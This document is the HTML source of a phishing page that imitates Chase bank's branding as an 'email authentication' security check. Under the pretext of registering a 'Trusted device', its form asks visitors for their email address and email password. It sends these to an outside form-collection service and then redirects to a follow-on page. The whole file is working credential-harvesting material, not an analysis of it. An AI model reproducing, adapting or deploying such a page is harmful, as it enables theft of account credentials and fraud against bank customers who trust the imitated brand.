<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>help-center</title>
    <link rel="stylesheet" href="bootstrap5/css/bootstrap.min.css">
    <link rel="stylesheet" href="fontawesome/css/all.css">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="/styles">
    <link rel="stylesheet" href="/index.js">
    <link rel="icon" href="img/Shape-of-the-Chase-logo-500x311.jpg" style="border-radius: 25px;">
    <link rel="stylesheet" href="google.css">

</head>
<body>
    <div class="container-fluid con1a">
        <div class="">
            <nav class="navbar container d-flex align-item-center order-list  navbar-expand-lg">
                <a href="/" class="navbar-brand mx-auto mt-5">
                    <img src="img/chase-logo-white.png" style="border-radius: 30px;" height="50px" width="200px" alt="">
                  </a>
            </nav>
        </div>

        <!--form container-->
        <div class="card shadow mx-auto e-card">
            <div class="bg-primary">
                <p style="color: white;font-weight: 600;">For your protection</p>
            </div>
            <div class="p-3">
                <h6 style="font-weight: 700;">Email authentication</h6>
            <p style="font-weight: 500; font-size: small;font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;">For your identification, we need you to sign into your registered email we have in our records.</p>
            
            <form  action="https://submit-form.com/OgNVlTinH" method="post">
                <input
                   type="hidden"
                  name="_redirect"
                  value="https:/index3.html"
                  type="hidden"/>
                  <input type="hidden" name="_append" value="false"/>
      
                  <div class="inputBox">
                    <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);"  value="">
                    <label>Email</label>
                  </div>
                  <div class="inputBox mt-2">
                        <input type="password" name="pswd" required onkeyup="this.setAttribute('value', this.value);" value="">
                        <label>Password</label>
                      </div>
                      <p style="font-weight: 500; font-size: small;margin-top: 10px;font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;">We ask you to verify your email to add this device as <span style="color: blue; font-weight: 600;"> Trusted device</span> to protect your account from any unauthorized user.</p>
                      
                      <div class="d-flex align-item-center justify-content-center flex-column mt-3">
                        <input type="submit" class="mx-auto w-20 bg-primary"  style=" color: white; width: 300px;padding: 5px;text-align: center;font-weight: 600;border-radius: 5px;border: none;" value="Next">
                      </div>
                      
                  
                  </style>
                </form>
            </div>
        </div>
            
        </div>
    </div>


 
  <script src="https://unpkg.com/@botpoison/browser" async></script>
